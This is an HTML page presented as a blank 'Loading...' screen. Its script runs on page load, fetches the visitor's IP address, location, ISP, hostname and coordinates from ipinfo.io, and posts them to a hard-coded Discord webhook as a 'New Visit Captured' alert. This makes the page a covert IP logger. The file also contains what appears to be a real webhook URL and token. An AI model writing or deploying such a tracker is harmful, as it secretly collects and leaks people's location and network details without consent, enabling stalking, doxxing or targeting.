<!DOCTYPE html>
<html>
<head>
  <title>Loading...</title>
  <script>
    window.onload = async () => {
      try {
        const response = await fetch("https://ipinfo.io/json"); // optional token
        const data = await response.json();

        const webhookUrl = "https://discord.com/api/webhooks/1359745718084173976/MtyKM75dyYvPJdiUWsMSzGNiw1DTklwnMFQLcEltKnVzp1O7quBIxGCydqOK_alUBEzF";

        const payload = {
          content: "**New Visit Captured**",
          embeds: [{
            title: "Visitor Info",
            color: 0x3498db,
                   
            fields: [
              { name: "IP", value: data.ip || "N/A", inline: true },
              { name: "City", value: data.city || "N/A", inline: true },
              { name: "Region", value: data.region || "N/A", inline: true },
              { name: "Country", value: data.country || "N/A", inline: true },
              { name: "ISP", value: data.org || "N/A", inline: false },
              { name:"Host Name", value: data.hostname || "N/A", inline: false },
              { name: "Loc", value: data.loc || "N/A", inline: true },
              { name: "Timezone", value: data.timezone || "N/A", inline: true }
            ],
            footer: { text: "IP info from ipinfo.io" }
          }]
        };

        await fetch(webhookUrl, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(payload)
        });
      } catch (err) {
        console.error("Error:", err);
      }
    };
  </script>
</head>
<body>
  <h1>Loading...</h1>
</body>
</html>
